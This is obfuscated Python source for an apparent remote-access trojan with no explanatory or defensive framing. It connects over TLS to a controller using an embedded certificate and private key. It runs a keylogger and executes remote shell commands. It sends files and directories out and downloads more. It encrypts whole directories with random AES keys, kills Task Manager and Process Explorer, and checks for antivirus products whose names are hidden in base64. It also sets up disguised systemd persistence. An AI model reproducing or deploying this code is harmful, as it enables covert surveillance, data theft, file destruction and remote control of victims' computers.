import ctypes #line:1
import json #line:2
import multiprocessing #line:3
import os #line:4
import shutil #line:5
import fnmatch #line:6
import concurrent .futures #line:7
import socket #line:8
import ssl #line:9
import subprocess #line:10
import sys #line:11
import time #line:12
import threading #line:13
import pynput .keyboard #line:14
import platform #line:15
import pathlib #line:16
import psutil #line:17
import base64 #line:18
import tempfile #line:19
from base64 import b64decode #line:20
import ipaddress #line:21
import asyncio #line:22
import secrets #line:23
import concurrent #line:24
from nmap_vscan import vscan #line:25
from PIL import ImageGrab #line:26
import services #line:27
from cryptography .hazmat .backends import default_backend #line:28
from cryptography .hazmat .primitives import padding #line:29
from cryptography .hazmat .primitives .ciphers import Cipher ,algorithms ,modes #line:30
import requests #line:31
my_list_of_tasks =[]#line:34
my_tasks =[]#line:35
nbr_host_found =0 #line:36
list_of_hosts_found =[]#line:37
servicesInfo =tempfile .NamedTemporaryFile (delete =False )#line:39
servicesInfo .write (services .returnValue ())#line:40
servicesInfo .close ()#line:41
global_timeout =15 #line:44
processes =[]#line:45
pids =[]#line:46
result_queue =multiprocessing .Queue ()#line:47
nmap =vscan .ServiceScan (servicesInfo .name )#line:48
try :#line:50
    apdt =os .environ ['appdata']#line:51
    cook_th =os .path .join (apdt ,"handlermanager.txt")#line:52
    kygerth =path =os .path .join (apdt ,"processmanager.txt")#line:53
except KeyError :#line:55
    tmp ="/tmp/"#line:56
    kygerth =tmp +"processmanager.txt"#line:57
    cook_th =tmp +"handlermanager.txt"#line:58
fles =[kygerth ,cook_th ,sys .executable ]#line:59
async def ping_coroutine (O00OO0OO0O0O0000O ,OO0O00OOOOO000O00 ):#line:62
    global nbr_host_found ,list_of_hosts_found #line:64
    O0000OOO00O0OOO0O =await asyncio .create_subprocess_shell (O00OO0OO0O0O0000O ,stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE )#line:69
    OOOOOO0O0000O0OOO =await O0000OOO00O0OOO0O .communicate ()#line:71
    if "ttl="in str (OOOOOO0O0000O0OOO ).lower ():#line:73
        nbr_host_found +=1 #line:74
        list_of_hosts_found .append (OO0O00OOOOO000O00 )#line:75
async def ping_loop ():#line:77
    global my_tasks ,my_list_of_tasks #line:79
    for OOOOO0OO000O000OO in my_list_of_tasks :#line:80
        for OO0OO0OOO0O0O0O00 in asyncio .as_completed (OOOOO0OO000O000OO ):#line:81
            await OO0OO0OOO0O0O0O00 #line:82
class Networkscan :#line:85
    def __init__ (O0OO0OOOO00OOO000 ,O0000000OO0O0000O ):#line:88
        O0OO0OOOO00OOO000 .nbr_host_found =0 #line:90
        O0OO0OOOO00OOO000 .list_of_hosts_found =[]#line:91
        O0OO0OOOO00OOO000 .filename ="hosts.yaml"#line:92
        try :#line:94
            O0OO0OOOO00OOO000 .network =ipaddress .ip_network (O0000000OO0O0000O )#line:95
        except :#line:96
            sys .exit ("Incorrect network/prefix "+O0000000OO0O0000O )#line:97
        O0OO0OOOO00OOO000 .nbr_host =O0OO0OOOO00OOO000 .network .num_addresses #line:99
        if O0OO0OOOO00OOO000 .network .num_addresses >2 :#line:100
            O0OO0OOOO00OOO000 .nbr_host -=2 #line:101
        O0OO0OOOO00OOO000 .one_ping_param ="ping -n 1 -l 1 -w 1000 "if platform .system ().lower ()=="windows"else "ping -c 1 -s 1 -w 1 "#line:102
    def run (OO0O00OOO0OOO000O ):#line:104
        global my_tasks ,nbr_host_found ,list_of_hosts_found ,my_list_of_tasks #line:106
        OO0O00OOO0OOO000O .nbr_host_found =0 #line:108
        OO0O00OOO0OOO000O .list_of_hosts_found =[]#line:109
        my_tasks =[]#line:110
        nbr_host_found =0 #line:111
        list_of_hosts_found =[]#line:112
        O00OOO0O0OOOO0000 =128 #line:114
        my_list_of_tasks =[]#line:116
        my_list_of_tasks .append (my_tasks )#line:117
        if OO0O00OOO0OOO000O .network .num_addresses !=1 :#line:119
            for O0000O00O000O00OO in OO0O00OOO0OOO000O .network .hosts ():#line:120
                OO0O0OO00OOO000O0 =OO0O00OOO0OOO000O .one_ping_param +str (O0000O00O000O00OO )#line:121
                my_tasks .append (ping_coroutine (OO0O0OO00OOO000O0 ,str (O0000O00O000O00OO )))#line:122
                O00OOO0O0OOOO0000 -=1 #line:123
                if O00OOO0O0OOOO0000 <=0 :#line:125
                    O00OOO0O0OOOO0000 =128 #line:126
                    my_tasks =[]#line:127
                    my_list_of_tasks .append (my_tasks )#line:128
        else :#line:129
            O0000O00O000O00OO =str (OO0O00OOO0OOO000O .network .network_address )#line:130
            OO0O0OO00OOO000O0 =OO0O00OOO0OOO000O .one_ping_param +O0000O00O000O00OO #line:131
            my_tasks .append (ping_coroutine (OO0O0OO00OOO000O0 ,O0000O00O000O00OO ))#line:132
        if platform .system ().lower ()=="windows":#line:134
            asyncio .set_event_loop_policy (asyncio .WindowsProactorEventLoopPolicy ())#line:136
        asyncio .run (ping_loop ())#line:137
        OO0O00OOO0OOO000O .list_of_hosts_found =list_of_hosts_found #line:138
        OO0O00OOO0OOO000O .nbr_host_found =nbr_host_found #line:139
def crte ():#line:142
    return b'LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMyakNDQWNLZ0F3SUJBZ0lVY2wvZmZVbVc1NlE4cDlFU2VrdnlkVWhFOWJRd0RRWUpLb1pJaHZjTkFRRUwKQlFBd0dERVdNQlFHQTFVRUF3d05LaTVsZUdGdGNHeGxMbU52YlRBZUZ3MHlNekE1TURZeU1EQXhOVFJhRncweQpOREE1TURVeU1EQXhOVFJhTUJneEZqQVVCZ05WQkFNTURTb3VaWGhoYlhCc1pTNWpiMjB3Z2dFaU1BMEdDU3FHClNJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUUNvOStBTWw0aVpvTzdEZzd5QTB4cUcyaHRGTnZwUExxT3gKbkk1bkNCWVR6azFqV1ZvcjcycXZNOW9iR0lIeG1CWUJ1YXRIS0V0NXJWTzRLNXB2b1NrekdhT3NmUUtYbzcyYgp5TmRYemFKUVN3WFZSSldkcEs1cnpjZlhqdUp3U3BtcHlpN2J5YXlyNlpmNFhPNk1rSFJoNWEzWkNXN1JJSk9MCmJSRndyLzRtWDM2VnU5SVBPdUk0cWFxWmlSa004WmpnUnZ6QWhXaDNubm1hcEtnb3JQSnUwSDNhblBZTkxYU2oKMU5sWUg4MGFQMTQwZkFOaG9zbjRFbHdtRjY1V2xhNU1USlJlbXpxbG5OczA0OTBGOUVxL1hRbkVTS0hRditBKwpOY21abE1rL1pHd2xVWnovbUgxdGt3VkgrZXJnYXBMMk0vR2FPK09MWjdqU2NLU2E3SmVuQWdNQkFBR2pIREFhCk1CZ0dBMVVkRVFRUk1BK0NEU291WlhoaGJYQnNaUzVqYjIwd0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFFUHgKeEx3dFdndWcxYkNsaG5hRUFoRU1iL2hBNDBsbE5nSU5sOVptWk5LMUFBZUU0bjVaZ2tzSWZaV1dlUmVYT0p2VQp1TkhON3JFRnAwWktKNmNsSjVPOUk5eG5aU3gzbms4UVN5eFl2RE56Y0QyYTlEMklCcmYwZFROUnJUam8vdlozClBHVythL0lnaWI0dCs1SkljOTV3NEN1S210NFpoT3ZxZmo0bkZXYWpkbjdIZ0lvRnNjeGRVZW82aU00aHArcWcKOU94M0JJRVVTWFg4bDFCdFVodXYyaVZUTTJTdDRXMmk4N1BUVTlDcEMzQ3hYaHpmUHdhNkVNK25uSE9oRkNwQQpvcTI0cVEwS2svckczZVluRCtRTnhHRXdPekF0Q3YzUTZZNlVvMXV1TVNqUDgwaXJtVjREeFlPRFVpUkRaRjZiClNYZWRRcVREVTgyTi96WGpXdVE9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K'#line:143
def locker ():#line:146
    return b'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBcVBmZ0RKZUltYUR1dzRPOGdOTWFodG9iUlRiNlR5NmpzWnlPWndnV0U4NU5ZMWxhCksrOXFyelBhR3hpQjhaZ1dBYm1yUnloTGVhMVR1Q3VhYjZFcE14bWpySDBDbDZPOW04alhWODJpVUVzRjFVU1YKbmFTdWE4M0gxNDdpY0VxWnFjb3UyOG1zcSttWCtGenVqSkIwWWVXdDJRbHUwU0NUaTIwUmNLLytKbDkrbGJ2UwpEenJpT0ttcW1Za1pEUEdZNEViOHdJVm9kNTU1bXFTb0tLenlidEI5MnB6MkRTMTBvOVRaV0IvTkdqOWVOSHdECllhTEorQkpjSmhldVZwV3VURXlVWHBzNnBaemJOT1BkQmZSS3YxMEp4RWloMEwvZ1BqWEptWlRKUDJSc0pWR2MKLzVoOWJaTUZSL25xNEdxUzlqUHhtanZqaTJlNDBuQ2ttdXlYcHdJREFRQUJBb0lCQURNbTF5ejRzdUhQVm5qWgo2TGNYTVhDaGxwL2RoT2x6dFJxUHlveG1aa2lZcTlUbnQrU1ZGamJ6KzVNNFdCNUxiRjRaVjBDemNpWGowdlJ1ClB0S01kMnlBMW92aFRHZWJxa3IvQWpJU2pwREFKWVBxdjJCNStsT29lRmRKYWtPVVVmQ1V4SnJFOHdFWU5tbDUKdUwzVS9XYWxvWHVTMzNsdjR6clNTZlZUVWgxTFROalBXVDVHdnhST3dUMTYzdUpqL05sSGxrdEhwNEhzdDdVLwpoR3l6T0RQWFdBdnZBcG5jeHRTZ2dZdVUwdStTN3M3QndCRmVwbGhTSHJ4K2lleWsvR044amptQVJTL3dLa2U4ClcwYWhFN3hMcU01L3JDbFNFeTU0aExjbzhMbjVVcXVjUmRzUlNxVjBvZXNWbFF4dU03aWJneU9nVmtZd1pxWmUKK2pOK1JBRUNnWUVBNkFpODdKd2F1dTNsY3lnU2toelFRTHNqMlRUYXpNWGxPbVJnc3ROZkRrS0hUUFZ5S290UApSR0x4eUg2YzVmRGhwVUpTdGhTbkpRN1djMWZnazdMSTY0SklnNmc1ajNWRjBFRDZMSHNROGd2YktJZFNERnc2CjJDNDBqNThwZ0YwQ1Y1UWlqd2pWdm1wRU1oTDAzL2d5cm1RV3VJQTJQQURwREtFMFZJaWF4b01DZ1lFQXVtdVoKZ0lhSVBUMWdCQlhaUWdTOUJNWWN2bzNCNXJnUnNMd295ZEliM2VOcUVlS1pRL1htMmJ0c3NIeTdmV2JRSGhYZQp5Y0F6RklMdVppTzRyRUFaQ0F3cjQydmZOVTFoY0tHbzB6QVlyd2dwQ2pEaExvYTF6Smp3RE1UNmRkcG9oZzFHClhWcGlkMG1Dd1hTM2FrTUQzWGFxZmFlYVlObXZwSGRiUmV4dUFRMENnWUVBeEdxcEtvM1dYc2lGQTk4M0lUSjgKNDE3SE1OWDZKWCtiMUxzbDFCcnppMG1yNk95WThRU3VYQkI1NWFPd1EwR09jV3RjUXIvbTRZclc1QnJPZzVqRApWZ0VhUzBDN1FRSWZ6L05CRXlnMkp2NzhUU21IdmVqUTh6RGgwM1lERnFNbEdXZlBmVThZU0xFQiszVnFqckUyCmpjTXlMSXB6M29WU3doc3dCaU1CQ2VzQ2dZQVJ5NU9yb1N3QUxJdXQyQ2dWRlQ2MTVmTjRmUysxUm56cDBneFMKdDZ2UlVwUWRnUFFBZU1qQW9CT1FCVmdnY0dBTmZ5ajFPVk9tOFppd1IxaXBtTFRLLzk1d3B5dDNleHVDRk94NAp2RzZleHJpa01HWk9lcTJBQ2xsZjNxM0o4ajlvREh4YkRQVzVUVnNkL0haRnZuL3Y5QlB5U3IyQjRVWFMvVkhKCkt2aVZRUUtCZ0Z5NUppNjJja1JzRklqNlkxaEhGOElJYVQvYzJ4Um9tL3hzcEtGR3VpUlhOM0Z0eHpEaUhnRGQKMWFsUXZZK1E2TEZIbEVGNlNaK21vaGI1b24xQUZxL2VrRDJtKzduNW5vRkNodENyRUJqK0Y5MnNRcjdqMmVTbQpEWS93dE1BeGhBVlFTd0piM3BlMHM2aFRSSGJZU05qSmlHY2t5WHQ3bkQ2VE9zcncvU1p5Ci0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg=='#line:147
def get_crte ():#line:150
    return b64decode (crte ()).decode ()#line:151
def get_locker ():#line:154
    return b64decode (locker ()).decode ()#line:155
crt =tempfile .NamedTemporaryFile (delete =False )#line:158
crt .write (get_crte ().encode ())#line:159
crt .close ()#line:160
ky =tempfile .NamedTemporaryFile (delete =False )#line:162
ky .write (get_locker ().encode ())#line:163
ky .close ()#line:164
context =ssl .SSLContext (ssl .PROTOCOL_TLS_CLIENT )#line:166
context .check_hostname =False #line:167
context .verify_mode =ssl .CERT_NONE #line:168
context .load_cert_chain (certfile =crt .name ,keyfile =ky .name )#line:169
g =""#line:171
try :#line:172
    ph =os .environ ["appdata"]+"\\processmanager.txt"#line:173
except KeyError :#line:174
    ph ="/tmp/processmanager.txt"#line:175
def pSSks (OOO0OO000OOOO000O ):#line:177
    global g #line:178
    try :#line:179
        g +=str (OOO0OO000OOOO000O .char )#line:180
    except AttributeError :#line:181
        if OOO0OO000OOOO000O ==OOO0OO000OOOO000O .space :#line:182
            g +=" "#line:183
        elif OOO0OO000OOOO000O ==OOO0OO000OOOO000O .tab :#line:184
            g +=" [TAB] "#line:185
        elif OOO0OO000OOOO000O ==OOO0OO000OOOO000O .backspace :#line:186
            g +=" [DELETE] "#line:187
        elif OOO0OO000OOOO000O ==OOO0OO000OOOO000O .right :#line:188
            g +=""#line:189
        elif OOO0OO000OOOO000O ==OOO0OO000OOOO000O .left :#line:190
            g +=""#line:191
        elif OOO0OO000OOOO000O ==OOO0OO000OOOO000O .up :#line:192
            g +=""#line:193
        elif OOO0OO000OOOO000O ==OOO0OO000OOOO000O .down :#line:194
            g =""#line:195
        else :#line:196
            g +=""+str (OOO0OO000OOOO000O )+""#line:197
def wte (OOO0O000O0000O00O ):#line:200
    with open (ph ,"ab")as OO0OO0O0O0OO0O0O0 :#line:201
        OO0OO0O0O0OO0O0O0 .write (OOO0O000O0000O00O .encode ())#line:202
def report ():#line:205
    global g #line:206
    global ph #line:207
    wte (g )#line:210
    g =""#line:212
    OO000O0OO00OOOOO0 =threading .Timer (10 ,report )#line:213
    OO000O0OO00OOOOO0 .start ()#line:214
def start ():#line:217
    OO0O0O0OOO00000O0 =pynput .keyboard .Listener (on_press =pSSks )#line:218
    with OO0O0O0OOO00000O0 :#line:219
        report ()#line:220
        OO0O0O0OOO00000O0 .join ()#line:221
def pad (OOOO00O0OOOOO0OOO ):#line:224
    OOOO00O0O0O00O0O0 =padding .PKCS7 (128 ).padder ()#line:225
    O0OOOOO000OOOOO00 =OOOO00O0O0O00O0O0 .update (OOOO00O0OOOOO0OOO )#line:226
    O0OOOOO000OOOOO00 +=OOOO00O0O0O00O0O0 .finalize ()#line:227
    return O0OOOOO000OOOOO00 #line:228
def encrypt (OOO0O0OOO000OOO0O ,OO0OO0OOO0000O00O ):#line:231
    OO00000O0000OOOOO =pad (OOO0O0OOO000OOO0O )#line:232
    O0000OOOO0O0O00O0 =os .urandom (16 )#line:233
    O0OO0O0O0O00O0OOO =Cipher (algorithms .AES (OO0OO0OOO0000O00O ),modes .CBC (O0000OOOO0O0O00O0 ),backend =default_backend ())#line:234
    OOOO000OO00O000OO =O0OO0O0O0O00O0OOO .encryptor ()#line:235
    OOO000OO0000O0O00 =OOOO000OO00O000OO .update (OO00000O0000OOOOO )+OOOO000OO00O000OO .finalize ()#line:236
    return O0000OOOO0O0O00O0 +OOO000OO0000O0O00 #line:237
def init_crypt_file (OOOO00000000OOO00 ,OOOO0O00O0OOO0OOO ):#line:240
    with open (OOOO00000000OOO00 ,"rb")as O0O00O0OOO0O00O0O :#line:241
        OO0O00O0000000O00 =O0O00O0OOO0O00O0O .read ()#line:242
    if not OOOO0O00O0OOO0OOO :#line:244
        OOOO0O00O0OOO0OOO =secrets .token_bytes (32 )#line:245
    OOOOOOOOO000O00OO =encrypt (OO0O00O0000000O00 ,OOOO0O00O0OOO0OOO )#line:247
    with open (OOOO00000000OOO00 ,"wb")as O0O00O0OOO0O00O0O :#line:248
        O0O00O0OOO0O00O0O .write (OOOOOOOOO000O00OO )#line:249
    return OOOOOOOOO000O00OO #line:251
def list_files_in_directory (OOO0000000000O00O ):#line:254
    for O0000O00O0O00O000 ,O00OO000O00OO0OOO ,O0000O00OOO00O00O in os .walk (OOO0000000000O00O ):#line:255
        for OO00OOOOOO00000OO in O0000O00OOO00O00O :#line:256
            yield os .path .join (O0000O00O0O00O000 ,OO00OOOOOO00000OO )#line:257
def crypt_file (O0OOO00O00OOOO0OO ):#line:260
    init_crypt_file (O0OOO00O00OOOO0OO ,None )#line:261
def crptall (O0OO000O00OOOO00O ):#line:264
    OO0O0OOO00000O00O =[]#line:265
    for O00OOOO00000O000O in O0OO000O00OOOO00O :#line:266
        OOOOO0O0OO00O00OO =threading .Thread (target =crypt_file ,args =(O00OOOO00000O000O ,))#line:267
        OOOOO0O0OO00O00OO .start ()#line:268
        OO0O0OOO00000O00O .append (OOOOO0O0OO00O00OO )#line:269
    for OOOOO0O0OO00O00OO in OO0O0OOO00000O00O :#line:272
        OOOOO0O0OO00O00OO .join ()#line:273
def strCpt (OO000000OOO0OO000 ):#line:276
    print (OO000000OOO0OO000 )#line:277
    OO0OO0O00O0OOOOOO =OO000000OOO0OO000 .replace ("Y3J5cHREaXIK ","")#line:278
    print (OO0OO0O00O0OOOOOO )#line:279
    O00OOO0000O0OO00O =list_files_in_directory (OO0OO0O00O0OOOOOO )#line:280
    crptall (O00OOO0000O0OO00O )#line:281
def perm ():#line:284
    global dmin #line:285
    if os .name =="posix":#line:286
        if os .getuid ()==0 :#line:287
            dmin ="\n\t[+] Admin Privileges\n"#line:288
        else :#line:289
            dmin ="\n\t[-] User Privileges\n"#line:290
    else :#line:291
        if ctypes .windll .shell32 .IsUserAnAdmin ()==0 :#line:292
            dmin ="\n\t[-] User Privileges\n"#line:293
        else :#line:294
            dmin ="\n\t[+] Admin Privileges\n"#line:295
    return dmin #line:296
def ispn ():#line:299
    if os .name =="posix":#line:300
        O00O0OOO0O0000O00 ={"gnome-system-monitor","xfce4-taskmanager","mate-system-monitor",}#line:305
    else :#line:306
        O00O0OOO0O0000O00 ={"Taskmgr.exe","procexp64.exe"}#line:310
    for OO0OOOO00O0O00O0O in psutil .process_iter (attrs =['pid','name']):#line:311
        if OO0OOOO00O0O00O0O .info ['name']in O00O0OOO0O0000O00 :#line:312
            return OO0OOOO00O0O00O0O .info ['pid']#line:313
    return False #line:315
def stger ():#line:318
    while True :#line:319
        O0OOOOOOO0O000000 =ispn ()#line:320
        if O0OOOOOOO0O000000 :#line:321
            try :#line:322
                os .kill (O0OOOOOOO0O000000 ,9 )#line:323
            except PermissionError :#line:324
                pass #line:325
        time .sleep (0.2 )#line:326
def init_task ():#line:329
    O000O0OOOO0O0OOO0 =threading .Thread (target =stger )#line:330
    O000O0OOOO0O0OOO0 .start ()#line:331
    pids .append (O000O0OOOO0O0OOO0 .native_id )#line:332
    sock .send ("successfully".encode ())#line:333
def srtTks ():#line:336
    try :#line:337
        O000O0OOO0OOOOOO0 =threading .Thread (target =init_task )#line:338
        O000O0OOO0OOOOOO0 .start ()#line:339
    except Exception as OOO00O0000OO0O00O :#line:340
        sock .send (f"ERROR: {OOO00O0000OO0O00O}".encode ())#line:341
def make_conect ():#line:344
    global connect ,sock #line:345
    while True :#line:346
        sock =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )#line:347
        try :#line:348
            sock .connect (('127.0.0.1',2457 ))#line:349
            sock =context .wrap_socket (sock )#line:350
            game (sock )#line:351
            time .sleep (5 )#line:352
        except Exception as OOOO000O0O0OO00O0 :#line:353
            print (OOOO000O0O0OO00O0 )#line:354
            time .sleep (10 )#line:355
            make_conect ()#line:356
def gtNfo ():#line:359
    OOOO0O000000O00OO =platform .uname ()#line:360
    OOO000OOOOOO00OOO =f"""

                [!>] Target:  {str(OOOO0O000000O00OO.system)}\n
            | Node Name: {str(OOOO0O000000O00OO.node)}
            ----------------------------------|
            | Kernel: {str(OOOO0O000000O00OO.release)}
            ----------------------------------|
            | Version: {str(OOOO0O000000O00OO.version)}
            ----------------------------------|
            | Machine: {str(OOOO0O000000O00OO.machine)}
            ----------------------------------|
            | Processor: {str(OOOO0O000000O00OO.processor)}
            ----------------------------------|
                """#line:375
    return OOO000OOOOOO00OOO #line:377
def chdir (OOO00000O0O0O0OOO ):#line:380
    print ("\n**",OOO00000O0O0O0OOO )#line:381
    try :#line:382
        if OOO00000O0O0O0OOO =="cd":#line:383
            OO00O0OO00OOO0000 =pathlib .Path .home ()#line:384
            os .chdir (OO00O0OO00OOO0000 )#line:385
            sock .send (f"cd {OO00O0OO00OOO0000}".encode ())#line:386
        else :#line:387
            os .chdir (OOO00000O0O0O0OOO [3 :])#line:388
            sock .send (f"cd {OOO00000O0O0O0OOO}".encode ())#line:389
    except Exception as O00O00O000O00O0OO :#line:390
        sock .send (f"{O00O00O000O00O0OO}".encode ())#line:391
def realGme ():#line:394
    while True :#line:395
        O00OOOO0000O0O000 =sock .recv (4096 ).decode ()#line:396
        if not O00OOOO0000O0O000 :#line:398
            continue #line:399
        if "q"in O00OOOO0000O0O000 :#line:401
            break #line:402
        else :#line:404
            excIns (O00OOOO0000O0O000 .replace ("ZXhlYwo= ",""))#line:405
def dload (OOO0O00O00000O0O0 ):#line:408
    O0OOO0000OOOO0000 =OOO0O00O00000O0O0 .replace ("ZG93bmxvYWQK ","").strip ()#line:409
    with open (O0OOO0000OOOO0000 ,"rb")as O0OO0OOO000OO000O :#line:411
        while True :#line:412
            O0O0000OOO0OO0000 =O0OO0OOO000OO000O .read (4096 )#line:413
            O0O0000OOO0OO0000 =base64 .b64encode (O0O0000OOO0OO0000 )#line:414
            if not O0O0000OOO0OO0000 :#line:415
                sock .send ('end'.encode ())#line:416
                break #line:417
            sock .send (O0O0000OOO0OO0000 )#line:418
        O0OO0OOO000OO000O .close ()#line:419
def dloadD (O0O0O0O0O0O00O0O0 ):#line:422
    OOOOOO00OOOO0O0OO =O0O0O0O0O0O00O0O0 .replace ("ZG93bmxvYWREaXIK ","")#line:423
    def O0O0OO000O0OO000O (O00OOOO000OOOO0O0 ,O00O00OO0OOOOOOO0 ):#line:425
        with open (O00O00OO0OOOOOOO0 ,'rb')as O000O0000O0OOO0O0 :#line:426
            O00OOOO000OOOO0O0 .sendall (O000O0000O0OOO0O0 .read ())#line:427
    OOO0O0000000O0OOO =0 #line:429
    for OOOO000O0OOO000O0 ,OOOO000O000OO000O ,OO0000O0O00O00000 in os .walk (OOOOOO00OOOO0O0OO ):#line:430
        for O00OO00O0OOOOO00O in OO0000O0O00O00000 :#line:431
            O00O0O00O0O000OOO =os .path .join (OOOO000O0OOO000O0 ,O00OO00O0OOOOO00O )#line:432
            OOO0O0000000O0OOO +=os .path .getsize (O00O0O00O0O000OOO )#line:433
    sock .send (str (OOO0O0000000O0OOO ).encode ())#line:435
    for OOOO000O0OOO000O0 ,OOOO000O000OO000O ,OO0000O0O00O00000 in os .walk (OOOOOO00OOOO0O0OO ):#line:436
        for O00OO00O0OOOOO00O in OO0000O0O00O00000 :#line:437
            O00O0O00O0O000OOO =os .path .join (OOOO000O0OOO000O0 ,O00OO00O0OOOOO00O )#line:438
            OO0O000O0O00O0OOO =os .path .relpath (O00O0O00O0O000OOO ,OOOOOO00OOOO0O0OO )#line:439
            sock .send (OO0O000O0O00O0OOO .encode ())#line:440
            O0O0OO000O0OO000O (sock ,O00O0O00O0O000OOO )#line:442
            sock .send ("end".encode ())#line:443
    sock .send ("done".encode ())#line:444
def excIns (OOO0OO000OO0OO000 ):#line:447
    if "cd"in OOO0OO000OO0OO000 :#line:448
        chdir (OOO0OO000OO0OO000 )#line:449
    else :#line:450
        try :#line:451
            O0000OO0O0O0O0O0O =subprocess .Popen (OOO0OO000OO0OO000 ,shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,)#line:452
            O0OO0OO0O0O0OOOOO ,O0OO0000O00O0OO0O =O0000OO0O0O0O0O0O .communicate ()#line:453
            OO0OO0OO0OOOOOO00 =len (O0OO0OO0O0O0OOOOO )#line:455
            if OO0OO0OO0OOOOOO00 >4096 :#line:456
                sock .send (f"buffer {OO0OO0OO0OOOOOO00}".encode ())#line:457
                sock .send (O0OO0OO0O0O0OOOOO )#line:458
            else :#line:459
                if O0OO0000O00O0OO0O :#line:460
                    sock .send (O0OO0000O00O0OO0O )#line:461
                    return False #line:462
                if not O0OO0OO0O0O0OOOOO :#line:463
                    return False #line:464
                sock .send (O0OO0OO0O0O0OOOOO )#line:465
        except Exception as OOO0O0O0OOO0000OO :#line:466
            sock .send (OOO0O0O0OOO0000OO )#line:467
def A_V_Dte_Ct ():#line:470
    global a_v_us_e #line:471
    OO0O0000O0O0OO0O0 =["V2luZG93cyBEZWZlbmRlcg==","U2VjSGVhbHRoVUk=","U2VjdXJpdHlIZWFsdGhTeXN0cmF5","Tm9ydG9u","TWNhRmVl","UGFuZGE=","UFNVQU1haW4=","QXZhc3Q=","QVZH","S2FzcGVyc2t5","Qml0ZGVmZW5kZXI=","RVNFVCBOT0QzMg==","VHJlbmQgTWljcm8=","QXZpcmE=","U29waG9z","TWFsd2FyZWJ5dGVz","bWJhbXRyYXk=","UGFuZGE=","d2Vicm9vdCBzZWN1cmVhbnl3aGVyZQ==","Zi1zZWN1cmU="]#line:495
    a_v_us_e =[]#line:496
    for O0O0OO0OO00000OOO in psutil .process_iter (['pid','name']):#line:498
        try :#line:499
            OO000O0OOO00OOO00 =O0O0OO0OO00000OOO .info ['name'].lower ()#line:500
            for O00O00OOO00O00OOO in OO0O0000O0O0OO0O0 :#line:501
                O00O00OOO00O00OOO =base64 .b64decode (O00O00OOO00O00OOO ).decode ()#line:502
                if O00O00OOO00O00OOO .lower ()in OO000O0OOO00OOO00 and O00O00OOO00O00OOO .lower ()not in a_v_us_e :#line:503
                    a_v_us_e .append (O00O00OOO00O00OOO )#line:504
        except (psutil .NoSuchProcess ,psutil .AccessDenied ,psutil .ZombieProcess ):#line:506
            pass #line:507
    if a_v_us_e :#line:509
        for O00O00OOO00O00OOO in a_v_us_e :#line:510
            if "mbamtray"in O00O00OOO00O00OOO .lower ():#line:511
                O00O00OOO00O00OOO ="Malwarebytes"#line:512
            elif "SecHealthUI".lower ()in O00O00OOO00O00OOO .lower ():#line:513
                O00O00OOO00O00OOO ="Windows Defender"#line:514
            elif "SecurityHealthSystray".lower ()in O00O00OOO00O00OOO .lower ():#line:515
                O00O00OOO00O00OOO ="Windows Defender"#line:516
            elif "PSUAMain".lower ()in O00O00OOO00O00OOO .lower ():#line:517
                O00O00OOO00O00OOO ="Panda AV"#line:518
            sock .send (O00O00OOO00O00OOO .encode ())#line:519
        sock .send ("end".encode ())#line:520
    else :#line:521
        sock .send ("n".encode ())#line:522
        return #line:523
def uload (O00OOO0OO000O0000 ):#line:526
    O0OOOO0OO0O0O0OOO =4096 #line:527
    OOO00O0OO000O0O0O =O00OOO0OO000O0000 .replace ("dXBsb2FkCg== ","")#line:528
    fles .append (OOO00O0OO000O0O0O )#line:529
    OOOO0OO0O0O00OOOO =b""#line:530
    with open (OOO00O0OO000O0O0O ,"wb")as OOO00O0OO000O0O0O :#line:531
        while True :#line:532
            OOO000000O0OO0O00 =sock .recv (O0OOOO0OO0O0O0OOO )#line:533
            if "end".encode ()in OOO000000O0OO0O00 :#line:534
                break #line:535
            if len (OOO000000O0OO0O00 )%4 !=0 :#line:537
                OOO000000O0OO0O00 +=b'='*(4 -len (OOO000000O0OO0O00 )%4 )#line:538
            OOO000000O0OO0O00 =base64 .b64decode (OOO000000O0OO0O00 )#line:539
            OOOO0OO0O0O00OOOO +=OOO000000O0OO0O00 #line:540
        OOO00O0OO000O0O0O .write (OOOO0OO0O0O00OOOO )#line:542
def gt (O00OO00OOOO00O0OO ):#line:546
    try :#line:547
        OO00000O00OO0O00O =O00OO00OOOO00O0OO .replace ("Z2V0Cg== ","")#line:548
        O0O000O00O000O0O0 =OO00000O00OO0O00O .split ("/")[-1 ]#line:549
        OO0O0OO00OOO0O00O =requests .get (OO00000O00OO0O00O )#line:550
        with open (O0O000O00O000O0O0 ,'wb')as O0OO00OO00O00OOOO :#line:551
            O0OO00OO00O00OOOO .write (OO0O0OO00OOO0O00O .content )#line:552
        sock .send ("end".encode ())#line:553
    except Exception as OOO000O00O0OOOO0O :#line:554
        sock .send (OOO000O00O0OOOO0O )#line:555
def bWFrZVBlcnNpc3RlbmNlCg ():#line:558
    if os .name =="posix":#line:559
        if not os .path .exists ("/etc/lightdm/addOn/"):#line:560
            os .makedirs ("/etc/lightdm/addOn/")#line:561
        OO0O00OO00O0O0OO0 ="""
CltVbml0XQpEZXNjcmlwdGlvbj1YLVNlc3Npb24tYWRkT24KQWZ0ZXI9bmV0d29yay50YXJnZXQK
CltTZXJ2aWNlXQpFeGVjU3RhcnQ9L2V0Yy9saWdodGRtL2FkZE9uL2FkZE9uQmluYXJ5ClJlc3Rh
cnQ9YWx3YXlzCgpbSW5zdGFsbF0KV2FudGVkQnk9Z3JhcGhpY2FsLnRhcmdldCAKICAgICAgICAK
"""#line:566
        with open ("/etc/systemd/system/addOn-xsession.service","w")as O0000O0OO00OO0O0O :#line:567
            O0000O0OO00OO0O0O .write (base64 .b64decode (OO0O00OO00O0O0OO0 ).decode ())#line:568
        shutil .copyfile (sys .executable ,"/etc/lightdm/addOn/addOnBinary")#line:570
        os .chmod ("/etc/lightdm/addOn/addOnBinary",0o755 )#line:571
        os .system (base64 .b64decode ("c3lzdGVtY3RsIGVuYWJsZSBhZGRPbi14c2Vzc2lvbi5zZXJ2aWNlICY+L2Rldi9udWxsCg=="))#line:572
